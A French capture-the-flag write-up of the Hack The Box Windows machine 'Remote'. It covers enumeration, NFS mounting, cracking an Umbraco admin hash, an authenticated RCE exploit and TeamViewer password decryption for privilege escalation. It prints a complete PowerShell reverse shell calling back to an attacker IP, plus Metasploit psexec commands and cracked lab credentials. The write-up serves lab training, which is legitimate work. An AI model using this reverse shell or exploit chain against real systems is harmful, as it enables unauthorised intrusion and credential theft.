![Pic1](../img/remote1.PNG?raw=true) </br>

# Introduction
Remote est une machine Windows dont l'adresse IP est 10.10.10.180.</br>
Compétences mises en oeuvre :
* Enumération des ports et services d'une machine distante.
* Enumération des fichiers/dossiers d'un site web.
* Montage d'un répertoire partagés.
* Transfert de fichier de l'attaquant à la box en powershell.
* Elévation de privilège via une ancienne version de TeamViewer.
</br>

# Enumération initiale
Nous commençons l'énumération par les ports et services de la machine distante avec nmap :
```bash
$ nmap -T4 -A 10.10.10.180
```
![Pic2](../img/remote2.PNG?raw=true) </br>
![Pic3](../img/remote3.PNG?raw=true) </br>
Beaucoup de ports sont ouverts, nous pouvons reconnaitre les ports habituels d'un serveur Windows :
*21 pour un serveur ftp, dont l'utilisateur Anonymous est autorisé.
*80 pour un serveur web.
*111 pour du rpc.
*135 pour du msrpc, il permet des appels de procédures RPC.
*139 pour du netbios-ssn, il permet la découverte et la connexion des voisins dans le réseau.
*445 pour un service SMB.
*2049 pour un démon de montage (rpc.mount).
</br>

Nous allons faire une énumération des fichiers/dossiers du site web avec dirsearch :
```bash
$ dirsearch -w wordlist -e "php,html,aspx" -f -t 100 -x 400,403,404,501 -u http://10.10.10.180
```
![Pic4](../img/remote4.PNG?raw=true) </br>
Plein de dossier, l'énumération n'est pas exhaustive, umbraco est intéréssant car c'est un cms.

# Obtenir un accès utilisateur
Pour l'instant, nous avons rien à faire avec Umbraco, nous allons voir les répertoires partagés disponibles :
```bash
$ showmount -e 10.10.10.180
```
![Pic5](../img/remote5.PNG?raw=true) </br>
Nous allons monter ce répertoire chez nous et l'explorer :
```bash
$ sudo mount.nfs 10.10.10.180:site_backups /mnt/site_backups/ -w
```
Le dossier site_backup étant une sauvegarde du site, en cherchant sur internet, nous trouvons que Umbraco garde les hash des mot de passes dans un fichier Umbraco.sdf :
```bash
$ strings App_Data\Umbraco.sdf | grep -A 2 -B 2 'dmin'
```
![Pic6](../img/remote6.PNG?raw=true) </br>
Maintenant que nous avons le hash de l'utilisateur admin, nous pouvons le cracker avec john :
```bash
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
![Pic7](../img/remote7.PNG?raw=true) </br>
Donc nous avons l'utilisateur admin:baconandcheese, nous allons voir s'il y a un exploit avec searchsploit pour Umbraco pour avoir une RCE authentifiée :
```bash
$ searchsploit umbraco
```
![Pic8](../img/remote8.PNG?raw=true) </br>
Après plusieurs tests, l'exploit ne fonctionne pas, au lieu d'y consacrer trop de temps, un autre exploit fonctionnel est sur github :
```bash
$ git clone https://github.com/noraj/Umbraco-RCE
$ python3 exploit.py -u "admin@htb.local" -p "baconandcheese" -i 'http://10.10.10.180/' -c powershell.exe -a '-NoProfile -Command whoami'
```
![Pic9](../img/remote9.PNG?raw=true) </br>
Edit : j'ai eu le même problème que l'exploit d'avant, sauf que j'ai reussis à résoudre le problème. Bref, maintenant que nous avons une RCE en powershell,
nous allons upload et executé un reverse shell en powershell :</br>
Contenu du fichier shell.ps1 :
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.43",8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Maintenant pour l'upload, nous allons mettre un serveur python3 en place, un listener sur le port 4567 et envoyer le shell avec powershell sur la box :
```bash
$ python3 -m http.server
```
```bash
$ nc -lvnp 4567
```
```bash
$ python3 exploit.py -u "admin@htb.local" -p "baconandcheese" -i 'http://10.10.10.180/' -c powershell.exe -a '-NoProfile -Command curl'
```
![Pic10](../img/remote10.PNG?raw=true) </br>
Après avoir reçu la connection sur netcat, nous allons regarder le fichier user.txt situé dans user/public.

# Obtenir un accès Administrateur
En jetant un oeil sur les logiciels installés, nous pouvons voir TeamViewer :
```bash
$ ls "C:\Program Files (x86)"
```
![Pic11](../img/remote11.PNG?raw=true) </br>
Il s'agit là d'une ancienne version de TeamViewer : version 7. Un exploit est disponible en ligne :</br>
https://whynotsecurity.com/blog/teamviewer/</br>
En résumé :
*Teamviewer garde les mot de passes dans le registre sous la valeur SecurityPasswordAES
*Les mot des passes sont chiffrés avec AES-128-CBC dont on a la Key et l'IV.
</br>

D'abord, il faut énumérer la clé de registre qui correspond à TeamViewer pour avoir le mot de passe chiffré :
```bash
$ reg query HKLM\SOFTWARE\Wow6432Node\TeamVierwer\Version7
```
![Pic12](../img/remote12.PNG?raw=true) </br>

Puis nous le crackons avec le script python vu dans le blog de whynotsecurity (ne pas oublier de remplacer la string correspondante au mot de passe) :
```bash
$ python3 decrypt.py
```
![Pic13](../img/remote13.PNG?raw=true) </br>
Maintenant nous pouvons nous connecter sur la machine avec le PsExec de metasploit et chercher le root.txt :
```bash
$ msfconsole
msf > use windows/smb/psexec
msf > set rhost 10.10.10.180
msf > set SMBUser administrator
msf > set SMBPass !R3m0te!
msf > run
Meterpreter > cat C:\\Users\Administrator\\Desktop\\root.txt
```
![Pic14](../img/remote14.PNG?raw=true) </br>